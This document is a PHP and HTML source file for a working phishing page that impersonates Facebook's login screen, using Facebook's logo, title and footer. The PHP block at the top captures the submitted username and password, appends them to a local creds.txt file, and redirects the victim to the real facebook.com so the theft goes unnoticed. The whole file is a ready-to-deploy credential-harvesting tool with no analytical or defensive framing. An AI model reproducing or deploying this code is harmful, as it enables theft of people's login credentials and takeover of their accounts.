<?php
$username=$password="";



//first of all define request_method cos apache doesnt allow it but php does
$request_method=strtoupper(getenv("REQUEST_METHOD"));
//check if request is post request
if($request_method == "POST"){
	
	//check if username field is empty
	if(empty(trim($_POST["username"]))){
		$username_err="Please enter username.";
		echo $username_err;
	}else{
		$username=trim($_POST["username"]);
	}
	
	//check if password field is empty
	if(empty(trim($_POST["password"]))){
		$password_err="Please enter password.";
		echo $password_err;
	}else{
		$password=trim($_POST["password"]);
	}
	
	
	//start validation if user&pass  are provided
	if((empty($username) && empty($password)) === false){
		$creds=fopen("creds.txt","a");
		$input="{$username}:{$password}";
		fwrite($creds ,"\n".$input);
		fclose($creds);
		header("location:https://facebook.com");
		
	}
}
?>




<!DOCTYPE html>
<html>

<head>
<title>Facebook</title>
<link rel="stylesheet" href="index.css">
</head>

<body>

<main>
<div class="phish">
<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="ic0n">
 <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
 <input type="text" class="form-control " name="username" value="<?php echo htmlspecialchars($username); ?>" placeholder="Mobile number or email address "><br>
  <input type="password" class="form-control " name="password" value="<?php echo htmlspecialchars($password); ?>" placeholder="Password "><br>
  <input type="submit" class="submit" value="Log In">

</form>

<div class="or">
<hr>or<hr> 
</div>

<button href="#">Create New Account</button><br>

<a href="#" class="fp">Forgotten password?</a>

</div>
</main>


<div class="des">
	
<dl>
  <dt><a href="#"><b>English (UK)</b></a></dt>
  <dd><a href="#">Português (Brasil)</a></dd>
  <dt><a href="#">Español</a></dt>
  <dd><a href="#">Deutsch</a></dd>
</dl>

<dl>
  <dt><a href="#">Hausa</a></dt>
  <dd><a href="#">Français (France)</a></dd>
  <dt><a href="#">Sالعربية</a></dt>
  <dd><a href="#">Italiano</a></dd>
</dl>
	
</div>

<footer>
<div class="end">
<a href="#">About</a>
<a href="#">.</a>
<a href="#">Help</a>
<a href="#">.</a>
<a href="#">More</a>
</div>
<br>
<p>Facebook Inc</p>
</footer>
</body>

</html>


